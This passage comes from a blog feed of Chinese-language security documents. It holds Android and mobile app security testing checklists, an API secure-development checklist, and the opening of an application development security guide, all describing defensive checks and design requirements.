yes</li><li>静态分析应用程序逻辑和动态跟踪结合，检查是否存在 WebView 对象注入漏洞和错误地使用 WebView 相关功能，如未禁止记住密码、允许 Javascript 访问本地域、忽略证书错误等。</li><li>WebView 的风险问题可能导致用户在浏览页面时被恶意安装应用、窃取隐私文件。</li></ul></li><li><p>应用卸载无法删除缓存数据</p><ul><li>中 低 调研</li><li>检查应用保存缓存数据位置及卸载逻辑。</li><li>如果缓存数据包含敏感信息，可能存在信息泄露风险。</li></ul></li><li><p>敏感信息允许使用剪贴板</p><ul><li>中 低 no</li><li>检查应用敏感信息是否可被用户复制。</li><li>Android 系统剪贴板可以被任意应用访问，如果允许用户复制敏感数据则存在信息泄露风险。</li></ul></li><li><p>本地认证绕过</p><ul><li>高 具体分析 no</li><li>静态分析本地认证措施（如手势密码等）是否可以被绕过。</li><li>逻辑问题可能导致本地认证绕过，在物理接触设备的情况下获取用户隐私或身份凭据。</li></ul></li><li><p>本地 socket 端口</p><ul><li>具体分析 具体分析 yes</li><li>检查是否可以伪造数据与本地 socket 端口进行通信，以及响应逻辑是否存在可利用的漏洞。</li><li>通过伪造数据可以任意触发 socket 服务端逻辑。</li></ul></li><li><p>Activity 劫持</p><ul><li>高 具体分析 yes</li><li>静态分析应用结合动态跟踪，检查是否可以劫持界面进行钓鱼攻击。</li><li>Activity 劫持可实现劫持界面，诱骗用户输入密码等关键信息</li></ul></li><li><p>命令注入</p><ul><li>高 具体分析 yes</li><li>检查应用是否存在命令注入</li><li>命令注入可导致任意命令执行</li></ul></li><li><p>使用隐式 Intent 动态授予 URI 权限</p><ul><li>具体分析 具体分析 yes</li><li>检查使用动态授予 URI 权限的 Intent 是否为显式。</li><li>当授予 ContentProvider 读或写权限的 Intent 被劫持，将存在信息泄露或被篡改风险</li></ul></li><li><p>广播或意图伪造</p><ul><li>具体分析 具体分析 调研</li><li>静态分析应用结合动态跟踪，检查是否可以通过伪造广播消息触发应用的特定流程。</li><li>广播伪造可让应用执行特定流程，进一步实现伪造用户请求、拒绝服务、本地权限提升等。</li></ul></li><li><p>广播或意图劫持</p><ul><li>具体分析 具体分析 yes</li><li>静态分析应用结合动态跟踪，检查是否存在将敏感信息发送至广播中。</li><li>广播劫持可截取应用程序的广播消息，获取参数中的敏感信息。</li></ul></li><li><p>Zip 路径穿越</p><ul><li>高 具体分析 调研</li><li>静态分析应用，检查是否正确处理 Zip 解压。</li><li>利用精心构造的 Zip 文件，可以跨路径覆盖应用的私有数据， 进而实现任意代码执行等。</li><li>需要能找到执行路径</li></ul></li><li><p>客户端XSS</p><ul><li>高 具体分析 调研</li><li>静态分析和模糊测试，检查客户端渲染 HTML 界面时是否能插入恶意代码。</li><li>利用精心构造的输入，在客户端 HTML 界面中植入特定逻辑，进一步实现获取用户凭据等。</li></ul></li><li><p>密码学实现问题</p><ul><li>具体分析 具体分析 部分</li><li>静态分析应用程序逻辑和动态跟踪结合，逆向密码学相关函数调用，检查是否存在错误的密码学实现，如硬编码的对称加密密钥或强度不足的单向散利函数。</li><li>错误的密码学功能实现将导致加密强度显著降低，结合其他问题进一步攻击应用程序。</li></ul></li><li><p>不安全的用户认证</p><ul><li>高 具体分析 no</li><li>静态分析应用程序逻辑和动态跟踪结合，逆向用户认证过程，检查是否存在逻辑和实现漏洞。</li><li>不安全的用户认证可能导致用户身份被冒用、撞库攻击等，危害帐号安全。</li></ul></li><li><p>内网 IP 泄漏</p><ul><li>中 低 yes</li><li>静态分析应用程序的代码中是否包含了硬编码的服务端私有地址。</li><li>攻击者可使用得到的地址，结合其他服务端应用对内网发起 SSRF 等类型的攻击。</li></ul></li><li><p>错误页面泄露隐私信息</p><ul><li>具体分析 低 no</li><li>检查应用异常状态下错误信息是否包含敏感信息。</li><li>客户端或服务端的异常信息中如果包含敏感数据则易导致信息泄露或者为攻击者提供额外信息</li></ul></li><li><p>客户端路径穿越</p><ul><li>高 具体分析 调研</li><li>静态分析应用程序逻辑，以及动态跟踪程序执行。</li><li>攻击者可使用路径穿越问题访问应用的私有数据。</li><li>需要找到可执行路径</li></ul></li><li><p>第三方代码问题</p><ul><li>具体分析 具体分析 调研</li><li>检测第三方 SDK 和程序引用及其版本，检查是否存在已知安全漏洞、后门甚至恶意代码。</li><li>程序通过 SDK 等方式引入的第三方代码，如包含后门、漏洞等，将直接影响到应用本身的安全，且难以自行修复。</li></ul></li><li><p>敏感内容输出到日志</p><ul><li>具体分析 低 调研</li><li>使用静态分析和动态运行相结合，检查应用是否将敏感信息输出到日志中。</li><li>攻击者可读取系统日志跨应用获取信息。</li></ul></li><li><p>未启用键盘记录保护</p><ul><li>中 低 调研</li><li>静态分析应用可执行文件，结合动态跟踪，根据应用安全性要求判断是否需要对特定输入控件添加自定义软键盘。</li><li>系统键盘可能导致第三方应用读取键盘缓存获取用户名，或使用屏幕录制截取用户输入。</li></ul></li><li><p>敏感应用未进行root检测</p><ul><li>低 低 yes</li><li>静态分析应用逻辑结合设备实机安装，判断应用是否根据自身需求对环境进行检测，以及告知用户 root 后的潜在的风险。</li><li>在已 root 设备上将极大增加 App 的攻击面，恶意软件可以使用非公开 API、Hook 等技术绕过应用沙盒，获取用户 token、登录凭据等敏感信息。</li></ul></li><li><p>访问控制不当</p><ul><li>高 低 no</li><li>静态分析应用可执行文件，结合动态跟踪，分析应用访问控制模型是否符合安全性要求。</li><li>错误的访问控制策略可能导致用户敏感信息遭到泄露。</li></ul></li><li><p>逻辑缺陷</p><ul><li>具体分析 具体分析 no</li><li>静态分析应用可执行文件，结合动态跟踪，分析应用是否存在可以被攻击利用的逻辑错误。</li><li>逻辑错误将导致应用出现非设计预期的行为。</li></ul></li><li><p>native代码可被调试</p><ul><li>中 具体分析 no</li><li>动态分析应用native部分程序是否使用反调试技巧防止代码被动态调试。</li><li>native代码可以被调试将降低对应用逆向工程的成本。</li></ul></li></ul>]]></content>
      
      <categories>
          
          <category> Security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全文档 </tag>
            
            <tag> SDL </tag>
            
            <tag> Checklist </tag>
            
            <tag> Android </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>APP安全测试</title>
      <link href="/Security/APP%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/"/>
      <url>/Security/APP%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/</url>
      <content type="html"><![CDATA[<h2 id="一、安装包测试"><a href="#一、安装包测试" class="headerlink" title="一、安装包测试"></a>一、安装包测试</h2><h3 id="1-1-关于反编译"><a href="#1-1-关于反编译" class="headerlink" title="1.1 关于反编译"></a>1.1 关于反编译</h3><p>　　目的是为了保护公司的知识产权和安全方面的考虑等，一些程序开发人员会在源码中硬编码一些敏感信息，如密码。而且若程序内部一些设计欠佳的逻辑，也可能隐含漏洞，一旦源码泄漏，安全隐患巨大。<br>　　为了避免这些问题，除了代码审核外，通常开发的做法是对代码进行混淆，混淆后源代码通过反软件生成的源代码是很难读懂的，测试中，我们可以直接使用反编译工具（dex2jar和jd-gui工具）查看源代码，判断是否进行了代码混淆，包括显而易见的敏感信息。</p><h3 id="1-2-关于签名"><a href="#1-2-关于签名" class="headerlink" title="1.2 关于签名"></a>1.2 关于签名</h3><p>　　这点IOS可以不用考虑，因为APP stroe都会校验。但Android没有此类权威检查，我们要在发布前校验一下签名使用的key是否正确，以防被恶意第三方应用覆盖安装等。可使用下列命令检查：<br><code>jarsigner -verify -verbose -certs apk包路径</code><br>　　若结果为“jar 已验证”，说明签名校验成功。</p><h3 id="1-3-完整性校验"><a href="#1-3-完整性校验" class="headerlink" title="1.3 完整性校验"></a>1.3 完整性校验</h3><p>　　为确保安装包不会在测试完成到最终交付过程中因为知足者趾问题发生文件损坏，需要对安装包进行完整性校验，通常做法是检查文件的md5值，而且一般可以通过自动化做校验。</p><h3 id="1-4-权限设置检查"><a href="#1-4-权限设置检查" class="headerlink" title="1.4 权限设置检查"></a>1.4 权限设置检查</h3><p>　　一般用户对自己的隐私问题十 分敏感，因此，我们需要对APP申请某些特定权限的必要性进行检查，如访问通讯录等。对于没有必要的权限，一般都建议开发 直接支除。</p><ul><li><strong>Android</strong>：直接检查manifest文件来读取应用所需要的全部权限，并结合需求进行校验此权限是否为必须的。manifest文件的修改也需要关注，在增加新权限前需要进行评估。</li><li><strong>IOS</strong>：没有类似manifest文件来查看，IOS的用户权限只有在用户使用APP到了需要使用的权限时，系统才会弹出提示框，提示用户当前APP需要访问照片、联系人列表等组件。我们可以扫描代码来查看项目工程中有哪些权限设置。通过搜索关键类名，如通讯录一般需要访问ABAddressBookRef，照片是UIImagePickerController等。如果是纯黑盒测试，则必须覆盖到所有代码路径才能保证没有遗漏，也可使用代码覆盖率测试判断是否覆盖。</li></ul><h2 id="二、敏感信息测试"><a href="#二、敏感信息测试" class="headerlink" title="二、敏感信息测试"></a>二、敏感信息测试</h2><p>　　数据库是否存储敏感信息，某些应用会把cookie类数据保存在数据库中，一旦此数据被他人获取，可能造成用户账户被盗用等严重问题，测试中在跑完一个包含数据库操作的测试用例后，我们可以直接查看数据库里的数据，观察是否有敏感信息存储在内。一般来说这些敏感信息需要用户进行注销操作后删除。如果是cookie类数据，建议设置合理的过期时间。<br>　　日志是否存在敏感信息，一般开发在写程序的过程中会加入日志帮助高度，所有可能会写入一些敏感信息，通常APP的发布版不会使用日志，但也不排除特殊情况。<br>　　配置文件是否存在敏感信息，与日志类似，我们需要检查配置文件中是否包含敏感信息。</p><h2 id="三、软键盘劫持"><a href="#三、软键盘劫持" class="headerlink" title="三、软键盘劫持"></a>三、软键盘劫持</h2><p>　　如果用户安装了第三方键盘，可能存在劫持情况，对此，我们在一些特别敏感的输入地方可以做检查，例如金融类APP登录界面的用户名密码输入框等，看是否支持第三方输入法，一般建议使用应用内的软键盘。</p><h2 id="四、账户安全"><a href="#四、账户安全" class="headerlink" title="四、账户安全"></a>四、账户安全</h2><ul><li>密码是否明文存储在后台数据库，在评审和测试中需要关注密码的存储。</li><li>密码传输是否加密，测试中我们需要查看密码是否被 明文传输，如果是HTTP接口，我们可以使用FIddler等工具直接查看。</li><li>账户锁定策略。对于 用户输入错误密码次数过多的情况，是否会将账户临时锁定，避免被暴力破解，</li><li>同时会话情况。一些应用对同时会话会有通知功能，这样至少可以让用户知识他的账户可能已经被泄漏了。在一定程度上能免提升用户体验。</li><li>注销机制。在客户端注销后，我们需要验证任何的来自该用户的，需要身份验证的接口调用都不能成功。</li></ul><h2 id="五、数据通信安全"><a href="#五、数据通信安全" class="headerlink" title="五、数据通信安全"></a>五、数据通信安全</h2><ul><li>关键数据是否散列或加密。密码在传输中必须是加密的，其他敏感信息传输前也需要进行散列或者加加密，以免被中间节点获取并恶意利用。</li><li>关键连接是否使用安全通信，例如HTTPS。在获知接口设计后我们需要评估是否其中内容包含敏感信息，如果未使用安全通信，需要知会开发修改。</li><li>是否对数字证书合法性进行验证。即便使用了安全通信，例如HTTPS，我们也需要在客户端代码中对服务端证书进行合法性校验。测试中可以使用Fiddler工具模拟中间人攻击方法。如果客户端对于Fiddler证书没有校验而能正常调用，则存在安全隐患。</li><li>是否校验数据合法性。在一些情况下，我们需要有方法来确保服务端下发的明文数据不被篡改。通常开发侧的实现方式是对数据进行数字签名并在客户端进行校验。我们可以模拟后台返回进行相关的测试工作。此外，对于其他一些客户端未进行数据校验的接口，我们也需要有意识地思考如果不进行校验是否会产生问题，并通过模拟后台返回验证。</li></ul><h2 id="六、组件安全测试"><a href="#六、组件安全测试" class="headerlink" title="六、组件安全测试"></a>六、组件安全测试</h2><p>　　这里主要是指Android平台各个组件是否能被 外部应用恶意调用从而带来一些安全问题。包括Activity、Service、ContentProvider、Broadcast等等。采用的测试方法是通过使用drozer工具结合查看代码的方式，具体使用方法可查看官方文档。</p><h2 id="七、服务端接口测试"><a href="#七、服务端接口测试" class="headerlink" title="七、服务端接口测试"></a>七、服务端接口测试</h2><p>　　主要关注服务端接口是否存在以下问题</p><ul><li>SQL注入</li><li>XSS跨站脚本攻击</li><li>CSRF跨站请求伪造</li><li>越权访问</li></ul><p>　　除了上述服务端问题外，我们还需要结合实际的需求，设计和代码，分析是否需求或设计本身就会带来安全问题。</p><h2 id="八、附录"><a href="#八、附录" class="headerlink" title="八、附录"></a>八、附录</h2><ul><li>软件权限</li></ul><ol><li>扣费风险：包括短信、拨打电话、连接网络等。</li><li>隐私泄露风险：包括访问手机信息、访问联系人信息等。</li><li>对App的输入有效性校验、认证、授权、数据加密等方面进行检测</li><li>限制/允许使用手机功能接入互联网</li><li>限制/允许使用手机发送接收信息功能</li><li>限制或使用本地连接</li><li>限制/允许使用手机拍照或录音</li><li>限制/允许使用手机读取用户数据</li><li>限制/允许使用手机写入用户数据</li><li>限制/允许应用程序来注册自动启动应用程序</li></ol><ul><li>数据安全性</li></ul><ol><li>当将密码或其它的敏感数据输入到应用程序时，其不会被存储在设备中，同时密码也不会被解码。</li><li>输入的密码将不以明文形式进行显示。</li><li>密码、信用卡明细或其他的敏感数据将不被存储在它们预输入的位置上。</li><li>不同的应用程序的个人身份证或密码长度必须至少在4-8个数字长度之间。</li><li>当应用程序处理信用卡明细或其它的敏感数据时，不以明文形式将数据写到其他单独的文件或者临时文件中。以防止应用程序异常终止而又没有删除它的临时文件，文件可能遭受入侵者的袭击，然后读取这些数据信息。</li><li>党建敏感数据输入到应用程序时，其不会被存储在设备中。</li><li>应用程序应考虑或者虚拟机器产生的用户提示信息或安全警告</li><li>应用程序不能忽略系统或者虚拟机器产生的用户提示信息或安全警告，更不能在安全警告显示前，利用显示误导信息欺骗用户，应用程序不应该模拟进行安全警告误导用户。</li><li>在数据删除之前，应用程序应当通知用户或者应用程序提供一个“取消”命令的操作。</li><li>应用程序应当能够处理当不允许应用软件连接到个人信息管理的情况。</li><li>当进行读或写用户信息操作时，应用程序将会向用户发送一个操作错误的提示信息。</li><li>在没有用户明确许可的前提下不损坏删除个人信息管理应用程序中的任何内容。</li><li>如果数据库中重要的数据正要被重写，应及时告知用户。</li><li>能合理的处理出现的错误。</li><li>意外情况下应提示用户。</li></ol><ul><li>通讯安全性</li></ul><ol><li>在运行软件过程中，如果有来电、SMS、蓝牙等通讯或充电时，是否能暂停程序，优先处理通信，并在处理完毕后能正常恢复软件，继续其原来的功能。</li><li>当创立连接时，应用程序能够处理因为网络连接中断，进而告诉用户连接中断的情况。</li><li>应能处理通讯延时或中断。</li><li>应用程序将保持工作到通讯超时，进而给用户一个错误信息指示有链接错误。</li><li>应能处理网络异常和及时将异常情况通报用户。</li><li>应用程序关闭网络连接不再使用时应及时关闭，断开。</li></ol><ul><li>人机接口安全测试</li></ul><ol><li>返回菜单应总保持可用。</li><li>命令有优先权顺序。</li><li>声音的设置不影响使用程序的功能。</li><li>应用程序必须能够处理不可预知的用户操作，例如错误的操作和同时按下多个键。</li></ol>]]></content>
      
      <categories>
          
          <category> Security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全文档 </tag>
            
            <tag> SDL </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>API安全开发Checklist</title>
      <link href="/Security/API%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91Checklist/"/>
      <url>/Security/API%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91Checklist/</url>
      <content type="html"><![CDATA[<h2 id="一、身份认证"><a href="#一、身份认证" class="headerlink" title="一、身份认证"></a>一、身份认证</h2><ul><li><p>[ ] 不要使用 <code>Basic Auth</code> 使用标准的认证协议 (如 JWT, OAuth).</p></li><li><p>[ ] 不要再造 <code>Authentication</code>, <code>token generating</code>, <code>password storing</code> 这些轮子, 使用标准的.</p></li><li><p>[ ] 在登录中使用 <code>Max Retry</code> 和自动封禁功能.</p></li><li><p>[ ] 加密所有的敏感数据.</p></li></ul><h3 id="1-1-JWT-JSON-Web-Token"><a href="#1-1-JWT-JSON-Web-Token" class="headerlink" title="1.1 JWT (JSON Web Token)"></a>1.1 JWT (JSON Web Token)</h3><ul><li><p>[ ] 使用随机复杂的密钥 (<code>JWT Secret</code>) 以增加暴力破解的难度.</p></li><li><p>[ ] 不要在请求体中直接提取数据, 要对数据进行加密 (<code>HS256</code> 或 <code>RS256</code>).</p></li><li><p>[ ] 使 token 的过期时间尽量的短 (<code>TTL</code>, <code>RTTL</code>).</p></li><li><p>[ ] 不要在 JWT 的请求体中存放敏感数据, 它是<a href="https://jwt.io/#debugger-io" target="_blank" rel="noopener">可破解的</a>.</p></li></ul><h3 id="1-2-OAuth-授权或认证协议"><a href="#1-2-OAuth-授权或认证协议" class="headerlink" title="1.2 OAuth 授权或认证协议"></a>1.2 OAuth 授权或认证协议</h3><ul><li><p>[ ] 始终在后台验证 <code>redirect_uri</code>, 只允许白名单的 URL.</p></li><li><p>[ ] 每次交换令牌的时候不要加 token (不允许 <code>response_type=token</code>).</p></li><li><p>[ ] 使用 <code>state</code> 参数并填充随机的哈希数来防止跨站请求伪造(CSRF).</p></li><li><p>[ ] 对不同的应用分别定义默认的作用域和各自有效的作用域参数.</p></li></ul><h2 id="二、访问"><a href="#二、访问" class="headerlink" title="二、访问"></a>二、访问</h2><ul><li><p>[ ] 限制流量来防止 DDoS 攻击和暴力攻击.</p></li><li><p>[ ] 在服务端使用 HTTPS 协议来防止 MITM 攻击.</p></li><li><p>[ ] 使用 <code>HSTS</code> 协议防止 SSLStrip 攻击.</p></li></ul><h2 id="三、输入"><a href="#三、输入" class="headerlink" title="三、输入"></a>三、输入</h2><ul><li><p>[ ] 使用与操作相符的 HTTP 操作函数, <code>GET (读取)</code>, <code>POST (创建)</code>, <code>PUT (替换/更新)</code> 以及 <code>DELETE (删除记录)</code>, 如果请求的方法不适用于请求的资源则返回 <code>405 Method Not Allowed</code>.</p></li><li><p>[ ] 在请求头中的 <code>content-type</code> 字段使用内容验证来只允许支持的格式 (如 <code>application/xml</code>, <code>application/json</code> 等等) 并在不满足条件的时候返回 <code>406 Not Acceptable</code>.</p></li><li><p>[ ] 验证 <code>content-type</code> 的发布数据和你收到的一样 (如 <code>application/x-www-form-urlencoded</code>, <code>multipart/form-data</code>, <code>application/json</code> 等等).</p></li><li><p>[ ] 验证用户输入来避免一些普通的易受攻击缺陷 (如 <code>XSS</code>, <code>SQL-注入</code>, <code>远程代码执行</code> 等等).</p></li><li><p>[ ] 不要在 URL 中使用任何敏感的数据 (<code>credentials</code>, <code>Passwords</code>, <code>security tokens</code>, or <code>API keys</code>), 而是使用标准的认证请求头.</p></li><li><p>[ ] 使用一个 API Gateway 服务来启用缓存、访问速率限制 (如 <code>Quota</code>, <code>Spike Arrest</code>, <code>Concurrent Rate Limit</code>) 以及动态地部署 APIs resources.</p></li></ul><h2 id="四、处理"><a href="#四、处理" class="headerlink" title="四、处理"></a>四、处理</h2><ul><li><p>[ ] 检查是否所有的终端都在身份认证之后, 以避免被破坏了的认证体系.</p></li><li><p>[ ] 避免使用特有的资源 id. 使用 <code>/me/orders</code> 替代 <code>/user/654321/orders</code></p></li><li><p>[ ] 使用 <code>UUID</code> 代替自增长的 id.</p></li><li><p>[ ] 如果需要解析 XML 文件, 确保实体解析(entity parsing)是关闭的以避免 <code>XXE</code> 攻击.</p></li><li><p>[ ] 如果需要解析 XML 文件, 确保实体扩展(entity expansion)是关闭的以避免通过指数实体扩展攻击实现的 <code>Billion Laughs/XML bomb</code>.</p></li><li><p>[ ] 在文件上传中使用 CDN.</p></li><li><p>[ ] 如果需要处理大量的数据, 使用 Workers 和 Queues 来快速响应, 从而避免 HTTP 阻塞.</p></li><li><p>[ ] 不要忘了把 DEBUG 模式关掉.</p></li></ul><h2 id="五、输出"><a href="#五、输出" class="headerlink" title="五、输出"></a>五、输出</h2><ul><li><p>[ ] 发送 <code>X-Content-Type-Options: nosniff</code> 头.</p></li><li><p>[ ] 发送 <code>X-Frame-Options: SAMEORIGIN(或deny)</code> 头.</p></li><li><p>[ ] 发送 <code>Content-Security-Policy: default-src &#39;none&#39;</code> 头.</p></li><li><p>[ ] 删除指纹头 - <code>X-Powered-By</code>, <code>Server</code>, <code>X-AspNet-Version</code> 等等.</p></li><li><p>[ ] 在响应中强制使用 <code>content-type</code>, 如果你的类型是 <code>application/json</code> 那么你的 <code>content-type</code> 就是 <code>application/json</code>.</p></li><li><p>[ ] 不要返回敏感的数据, 如 <code>credentials</code>, <code>Passwords</code>, <code>security tokens</code>.</p></li><li><p>[ ] 在操作结束时返回恰当的状态码. (如 <code>200 OK</code>, <code>400 Bad Request</code>, <code>401 Unauthorized</code>, <code>405 Method Not Allowed</code> 等等).</p></li></ul><h2 id="六、持续集成和持续部署"><a href="#六、持续集成和持续部署" class="headerlink" title="六、持续集成和持续部署"></a>六、持续集成和持续部署</h2><ul><li><p>[ ] 使用单元测试和集成测试来审计你的设计和实现.</p></li><li><p>[ ] 引入代码审查流程, 不要自行批准更改.</p></li><li><p>[ ] 在推送到生产环境之前确保服务的所有组件都用杀毒软件静态地扫描过, 包括第三方库和其它依赖.</p></li><li><p>[ ] 为部署设计一个回滚方案.</p></li></ul>]]></content>
      
      <categories>
          
          <category> Security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全文档 </tag>
            
            <tag> SDL </tag>
            
            <tag> Checklist </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>应用开发安全指南</title>
      <link href="/Security/%E5%BA%94%E7%94%A8%E5%BC%80%E5%8F%91%E5%AE%89%E5%85%A8%E6%8C%87%E5%8D%97/"/>
      <url>/Security/%E5%BA%94%E7%94%A8%E5%BC%80%E5%8F%91%E5%AE%89%E5%85%A8%E6%8C%87%E5%8D%97/</url>
      <content type="html"><![CDATA[<h2 id="一、-概述"><a href="#一、-概述" class="headerlink" title="一、 概述"></a>一、 概述</h2><p>本指南是IT安全保障体系建设规范的一个组成部分，全面阐述了IT系统应用开发整个软件生命周期所必须遵照的设计、编码、测试方面的安全要求，阐述了不同开发环境和编码语言条件下安全开发的相关规范要求。</p><h3 id="1-1-目的"><a href="#1-1-目的" class="headerlink" title="1.1 目的"></a>1.1 目的</h3><p>本指南针对应用系统应当遵循的应用开发安全标准进行了规范性说明，旨在指导应用系统设计人员、代码开发人员和安全检查管理人员进行应用安全开发的安全配置，以提高应用系统的安全防护能力。</p><h3 id="1-2-适用范围"><a href="#1-2-适用范围" class="headerlink" title="1.2 适用范围"></a>1.2 适用范围</h3><p>本指南适用于代码开发项目，作为在IT系统开发、设计环节中所遵照执行的依据。</p><h3 id="1-3-适用对象"><a href="#1-3-适用对象" class="headerlink" title="1.3 适用对象"></a>1.3 适用对象</h3><p>本配置指南的适用人员包括：系统应用开发人员及安全检查管理人员。</p><h2 id="二、-应用系统设计安全"><a href="#二、-应用系统设计安全" class="headerlink" title="二、 应用系统设计安全"></a>二、 应用系统设计安全</h2><h3 id="2-1-应用系统架构安全设计要求"><a href="#2-1-应用系统架构安全设计要求" class="headerlink" title="2.1 应用系统架构安全设计要求"></a>2.1 应用系统架构安全设计要求</h3><p>在应用系统设计阶段，应充分考虑该架构的安全性,包括B/S、C/S等形式的安全，主要体现在应用数据和用户会话的安全，还应当考虑应用系统自身体系架构内部的安全，以及与外系统接口的安全。针对某些特殊应用，还需考虑复、抗攻击等安全机制。所有的安全设计都是为了保证系统的稳定性和连续性，有针对性的解决自身安全问题。</p><h4 id="2-1-1-应用系统自身架构安全"><a href="#2-1-1-应用系统自身架构安全" class="headerlink" title="2.1.1 应用系统自身架构安全"></a>2.1.1 应用系统自身架构安全</h4><ul><li>1、 自身结构中各组件之间通讯过程的安全机制<br>组件之间的通讯包括命令级的和数据级的，应充分考虑：</li><li style="list-style: none"><input type="checkbox"> 传输命令和数据所采用的协议的安全性。应根据组件之间通讯内容安全性要求程度的不同选择不同安全性要求的协议；</li><li style="list-style: none"><input type="checkbox"> 考虑程序的模块之间的安全通讯机制；</li><li style="list-style: none"><input type="checkbox"> 不应使用标准的服务端口或者常见病毒、蠕虫等使用的服务端口。</li><li>2、 认证与访问控制机制，应考虑：</li><li style="list-style: none"><input type="checkbox"> 组件之间的信任机制；</li><li style="list-style: none"><input type="checkbox"> 用户的身份认证机制；</li><li style="list-style: none"><input type="checkbox"> 对于组件资源的访问控制机制；</li><li style="list-style: none"><input type="checkbox"> 不通用户对资源的权限控制机制。</li><li>3、 组件内重要文件和数据的安全防护机制：<br>存在于组件内部的重要数据资源应当考虑其相应的安全防护机制，这些重要的数据资源包括：</li><li style="list-style: none"><input type="checkbox"> 配置文件；</li><li style="list-style: none"><input type="checkbox"> 用户数据，包括文件数据及数据库中的数据；</li><li style="list-style: none"><input type="checkbox"> 临时文件和数据；</li><li style="list-style: none"><input type="checkbox"> 与外系统或者系统内部其他组件接口用的数据文件。<br>对这些重要数据的存取安全性设计，包括:</li><li style="list-style: none"><input type="checkbox"> 文件和数据存放是否加密及采用的加密方式。</li></ul><h4 id="2-1-2-应用系统与外系统接口的安全"><a href="#2-1-2-应用系统与外系统接口的安全" class="headerlink" title="2.1.2 应用系统与外系统接口的安全"></a>2.1.2 应用系统与外系统接口的安全</h4><p>应用系统与外系统的接口安全设计，主要应考虑以下几个要素：</p><ul><li>1、 与外系统的之间通讯中的安全机制。应充分考虑：</li><li style="list-style: none"><input type="checkbox"> 传输命令和数据所采用的协议的安全性。应根据系统之间通讯内容安全性要求程度的不同选择不同安全性要求的协议；</li><li style="list-style: none"><input type="checkbox"> 建议不使用默认的服务端口或者常见病毒、蠕虫等使用的服务端口，传输过程使用加密传输。</li><li>2、 与外系统的认证与访问控制机制，应考虑：</li><li style="list-style: none"><input type="checkbox"> 系统之间的信任机制；</li><li style="list-style: none"><input type="checkbox"> 会话凭据的有效时间；</li><li style="list-style: none"><input type="checkbox"> 可以访问资源的权限控制；</li><li style="list-style: none"><input type="checkbox"> 对于系统之间资源的访问控制机制。</li><li>3、 对外系统安全机制的符合性，应考虑：</li><li style="list-style: none"><input type="checkbox"> 如果外系统采用的接口方式经评估认为是安全的，本系统应当沿用其接口规范进行设计开发；</li><li style="list-style: none"><input type="checkbox"> 如果外系统采用的接口方式经评估认为存在安全缺陷，应商定采用更加安全的接口方式；</li><li style="list-style: none"><input type="checkbox"> 在考虑接口安全性的同时，也应当注意接口方式对双方系统性能、磁盘、连接数等各种性能指标和资源的影响。</li></ul><h4 id="2-1-3-应用系统其他的安全机制"><a href="#2-1-3-应用系统其他的安全机制" class="headerlink" title="2.1.3 应用系统其他的安全机制"></a>2.1.3 应用系统其他的安全机制</h4><p>除了上述基本的安全架构设计内容外，针对不同的应用，以及应用系统的重要程度，可以补充考虑以下几种安全机制：</p><ul><li>1、 针对Web应用的页面保护与恢复机制。<br>利用专用的安全产品，或者系统自身设计时就考虑到了对于Web页面进行静态保护和监控问题，当监控到网页被篡改时能够实时恢复页面。</li><li>2、 针对特殊数据的完整性检查和监控机制。<br>应用系统自身的审计机制。这一点也可算作是应用系统的安全功能设计的一部分，参见相关章节的要求。</li><li>3、 针对重要系统的DDOS攻击的解决方案。</li><li>4、 应用系统安全性分析。</li><li>5、 除了使用技术手段保证接口安全的同时，也需要保证接口相关代码和文件不被上传到互联网或泄漏给非必要人员。<br>任何系统都会存在一定的安全缺陷，关键在于风险和缺陷是否可以被容忍，因此，在应用系统设计完成后，应当就其安全性问题进行自我分析和评价。</li></ul><h4 id="2-2-应用系统软件功能安全设计要求"><a href="#2-2-应用系统软件功能安全设计要求" class="headerlink" title="2.2 应用系统软件功能安全设计要求"></a>2.2 应用系统软件功能安全设计要求</h4><p>除了在架构上考虑的安全机制外，这些安全机制及相关的安全功能也应当分配在应用系统软件的各部件中。应用系统在开发中应该考虑如下几个方面的安全功能：</p><ul><li style="list-style: none"><input type="checkbox"> 安全审计；</li><li style="list-style: none"><input type="checkbox"> 通讯安全（此部分内容在架构中进行了设计）；</li><li style="list-style: none"><input type="checkbox"> 数据保护；</li><li style="list-style: none"><input type="checkbox"> 认证与授权；</li><li style="list-style: none"><input type="checkbox"> 资源保障；</li><li style="list-style: none"><input type="checkbox"> 最小权限。</li></ul><h4 id="2-2-1-认证与授权功能的设计"><a href="#2-2-1-认证与授权功能的设计" class="headerlink" title="2.2.1 认证与授权功能的设计"></a>2.2.1 认证与授权功能的设计</h4><ul><li>1、 应用软件应包含用户身份认证体系的强度设计,重要系统应使用双因素或多因素认证措施，加强系统安全性：</li><li style="list-style: none"><input type="checkbox"> 用户名、口令认证；</li><li style="list-style: none"><input type="checkbox"> 一次性口令、动态口令认证；</li><li style="list-style: none"><input type="checkbox"> 证书认证；（可选）</li><li style="list-style: none"><input type="checkbox"> 生物特征的认证（签名、声音、指纹、虹膜、视网膜等）。（可选）</li><li>2、 应用软件应包含认证失败后的处理方式设计</li><li style="list-style: none"><input type="checkbox"> 连续失败3次，将锁定登录账号一个小时。账号锁定后可以由系统管理员解锁，也可以在一段时间后自动解锁；</li><li style="list-style: none"><input type="checkbox"> 通知用户认证失败，防止黑客暴力猜测；</li><li style="list-style: none"><input type="checkbox"> 验证码的功能，需要一定复杂度，防止被机器识别；</li><li style="list-style: none"><input type="checkbox"> 账号复杂度提醒功能。</li><li>3、 应用软件应包含用户权限分配和管理功能设计。</li><li style="list-style: none"><input type="checkbox"> 系统编码中要实现读、写、执行三个权限的分离设计；</li><li style="list-style: none"><input type="checkbox"> 系统查看、配置、修改、删除、登录、运行等权限设计；</li><li style="list-style: none"><input type="checkbox"> 数据访问范围的权限设计；</li><li style="list-style: none"><input type="checkbox"> 针对不同用户的数据库表权限隔离；</li><li style="list-style: none"><input type="checkbox"> 应用功能模块使用权限的设计。</li><li>4、 应用软件应包含接口设计，应明确系统的内部结构和外部接口，对于每一个对外接口应详细说明：</li><li style="list-style: none"><input type="checkbox"> 需要通信的对方系统的安全状况和可信程度；</li><li style="list-style: none"><input 